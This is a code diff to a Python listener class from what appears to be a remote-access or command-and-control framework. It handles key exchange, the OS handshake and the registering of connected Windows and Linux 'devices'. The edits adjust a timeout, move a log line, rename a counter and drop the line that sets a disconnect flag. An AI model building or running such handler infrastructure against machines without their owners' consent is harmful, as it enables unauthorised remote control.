@@ -11,7 +11,7 @@ class Listener(Base_Listener):
     def __init__(self, server, config, listener_id):
         super().__init__(server, config, listener_id)
         self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.listener.settimeout(1)
+        self.listener.settimeout(2)
         if self.ssl:
             self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
             self.ssl_context.load_cert_chain(
@@ -36,7 +36,6 @@ class Listener(Base_Listener):
                     self.remove_device(device)
                     log(f"Connection to {device.addr}  has been lost. [ID : {device.id}]",
                         alert="critical")
-                    device_disconnected = True
                     break
             if not device_disconnected:
                 time.sleep(10)
@@ -58,14 +57,14 @@ class Listener(Base_Listener):
                     connection.send(key)
                 except socket.error:
                     continue
-                log(
-                    f"New Connection established from {addr[0]}", alert="success")
                 try:
                     operating_system = self.decrypt(
                         connection.recv(1024), key).lower()
                 except socket.error:
                     connection.close()
                     continue
+                log(
+                    f"New Connection established from {addr[0]}", alert="success")
                 if operating_system == "windows":
                     # Create a Windows Object to store the connection
                     self.add_device(
@@ -73,14 +72,14 @@ class Listener(Base_Listener):
                             connection,
                             addr[0],
                             key,
-                            self.server.active_devices_count + 1))
+                            self.server.active_handlers_count + 1))
                 elif operating_system == "linux":
                     # Create a Linux Object to store the connection
                     self.add_device(
                         Linux(
                             connection, addr[0],
                             key,
-                            self.server.active_devices_count + 1))
+                            self.server.active_handlers_count + 1))
                 else:
                     log(f"Unknown Operating System: {operating_system}",
                         alert="error")
